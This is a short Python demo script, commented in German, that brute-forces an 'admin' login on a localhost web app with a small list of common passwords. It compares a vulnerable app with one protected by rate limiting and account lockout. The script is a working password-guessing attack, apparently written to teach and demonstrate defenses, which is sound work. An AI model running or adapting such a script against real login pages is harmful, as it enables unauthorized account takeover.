import requests
import time
import sys

# Anpassen je nach Demo (5000 = vulnerable, 5001 = secure)
PORT = int(sys.argv[1]) if len(sys.argv) > 1 else 5000
TARGET_URL = f"http://127.0.0.1:{PORT}/"
USERNAME   = "admin"

# Häufigste Passwörter (vereinfacht für Demo, echte Listen haben Millionen Einträge)
# Quelle: basierend auf bekannten Passwortlisten (RockYou etc.)
WORDLIST = [
    "abc123", "qwerty", "111111", "sunshine", "monkey",
    "dragon", "master", "12345678", "football", "letmein",
    "password",
    "password123",   # <- Das Passwort des admin-Accounts
    "iloveyou", "admin", "welcome",
]

print("=" * 55)
print(f"🔓 Brute-Force Angriff")
print(f"   Ziel:     {TARGET_URL}")
print(f"   Username: {USERNAME}")
print(f"   Wordlist: {len(WORDLIST)} Einträge")
print("=" * 55)

start = time.time()

for i, password in enumerate(WORDLIST):
    try:
        response = requests.post(
            TARGET_URL,
            data={"username": USERNAME, "password": password},
            allow_redirects=False,
            timeout=3
        )
    except requests.exceptions.ConnectionError:
        print(f"\n⚠️  Verbindung fehlgeschlagen – läuft die App auf Port {PORT}?")
        break

    # Erfolg: Server leitet weiter (302) statt Login-Formular (200) zurück
    if response.status_code == 302:
        elapsed = time.time() - start
        print(f"\n{'='*55}")
        print(f"✅ PASSWORT GEFUNDEN nach {i+1} Versuchen ({elapsed:.1f}s)!")
        print(f"   Benutzername: {USERNAME}")
        print(f"   Passwort:     {password}")
        print(f"{'='*55}")
        break
    elif response.status_code == 429:
        print(f"\n{'='*55}")
        print(f"🔒 ACCOUNT GESPERRT nach {i+1} Versuchen!")
        print(f"   Rate-Limiting / Account-Lockout hat angeschlagen.")
        print(f"   Brute-Force Angriff erfolgreich blockiert!")
        print(f"{'='*55}")
        break
    else:
        print(f"   [{i+1:02d}/{len(WORDLIST)}] '{password}' → Falsch")
        time.sleep(0.15)  # Kleine Pause für Demo-Lesbarkeit
else:
    print("\n❌ Passwort nicht gefunden – oder Account wurde gesperrt! 🔒")
    print("   → Rate-Limiting / Account-Lockout wirkt!")